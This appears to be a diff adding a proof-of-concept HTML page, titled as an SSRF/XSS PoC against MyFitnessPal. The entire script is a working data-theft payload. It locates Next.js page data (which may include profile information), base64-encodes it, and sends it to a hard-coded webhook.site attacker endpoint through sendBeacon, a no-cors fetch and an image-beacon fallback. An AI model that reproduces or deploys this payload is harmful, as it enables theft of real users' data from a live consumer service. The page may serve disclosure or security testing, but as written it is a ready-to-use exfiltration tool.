@@ -1,0 +1,110 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <title>MFP recipe SSRF/XSS PoC</title>
+</head>
+<body>
+  <h1>MyFitnessPal PoC</h1>
+  <p id="status">waiting...</p>
+
+<script>
+(async function() {
+  const STATUS = document.getElementById('status');
+
+  // Replace this with your attacker endpoint that collects POSTs, e.g.
+  // const ATTACKER_ENDPOINT = "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx";
+  // Or ngrok/Cloudflare URL:
+  const ATTACKER_ENDPOINT = "https://webhook.site/5816cddc-223e-4547-84ff-32eb5f2786bc";
+
+  function safeLog(msg) {
+    try { STATUS.textContent = msg; } catch (e) { /* ignore */ }
+    console.log("[PoC]", msg);
+  }
+
+  // Try common locations for Next.js / NEXT_DATA:
+  function findNextData() {
+    // window.__NEXT_DATA__ used by many Next.js apps
+    if (typeof window.__NEXT_DATA__ !== 'undefined') return window.__NEXT_DATA__;
+    // window.NEXT_DATA or window.next_data (some apps)
+    if (typeof window.NEXT_DATA !== 'undefined') return window.NEXT_DATA;
+    if (typeof window.next_data !== 'undefined') return window.next_data;
+
+    // check script tag with id __NEXT_DATA__ or next-data
+    const el = document.getElementById('__NEXT_DATA__') || document.querySelector('script[id^="__NEXT_DATA__"]');
+    if (el) {
+      try { return JSON.parse(el.textContent || el.innerText || '{}'); } catch(e) { return el.textContent || null; }
+    }
+
+    // fallback: try to find any obvious global that looks like profile data
+    try {
+      if (window && window.app && window.app.props) return window.app.props;
+    } catch(e){}
+
+    return null;
+  }
+
+  function encodePayload(obj) {
+    try { return typeof obj === 'string' ? btoa(unescape(encodeURIComponent(obj))) : btoa(unescape(encodeURIComponent(JSON.stringify(obj)))); }
+    catch(e){ return btoa(String(obj)); }
+  }
+
+  // Attempt to get NEXT_DATA
+  const data = findNextData();
+  if (!data) {
+    safeLog('NEXT_DATA not found on this page.');
+    // still try sending a beacon that the page was loaded
+    try {
+      navigator.sendBeacon(ATTACKER_ENDPOINT + '?event=page_loaded');
+    } catch(e){}
+    return;
+  }
+
+  safeLog('NEXT_DATA found — preparing exfiltration');
+
+  const payloadB64 = encodePayload(data);
+
+  // Primary: use navigator.sendBeacon (simple, works across navigation)
+  try {
+    const blob = new Blob([JSON.stringify({ next_data_b64: payloadB64, source: location.href })], { type: 'application/json' });
+    const ok = navigator.sendBeacon(ATTACKER_ENDPOINT + '/beacon', blob);
+    if (ok) {
+      safeLog('Sent via navigator.sendBeacon → ' + ATTACKER_ENDPOINT + '/beacon');
+      return;
+    } else {
+      console.warn('sendBeacon returned false — fallback to fetch');
+    }
+  } catch (e) {
+    console.warn('sendBeacon failed', e);
+  }
+
+  // Fallback #1: fetch() with no-cors (opaque request) — webhook.site / ngrok will still receive the request
+  try {
+    await fetch(ATTACKER_ENDPOINT + '/fetch', {
+      method: 'POST',
+      mode: 'no-cors',
+      keepalive: true,
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ next_data_b64: payloadB64, src: location.href })
+    });
+    safeLog('Sent via fetch(no-cors) to ' + ATTACKER_ENDPOINT + '/fetch (may be opaque).');
+    return;
+  } catch (e) {
+    console.warn('fetch(no-cors) failed', e);
+  }
+
+  // Fallback #2: image beacon GET (may hit length limits)
+  try {
+    const img = new Image();
+    // put a short id to avoid super-long URL: send only a short token if necessary
+    img.src = ATTACKER_ENDPOINT + '/img?d=' + encodeURIComponent(payloadB64.slice(0, 2000));
+    document.body.appendChild(img);
+    safeLog('Tried to send via Image beacon (truncated).');
+  } catch (e) {
+    console.warn('image beacon failed', e);
+    safeLog('All exfil attempts failed (check console).');
+  }
+})();
+</script>
+</body>
+</html>
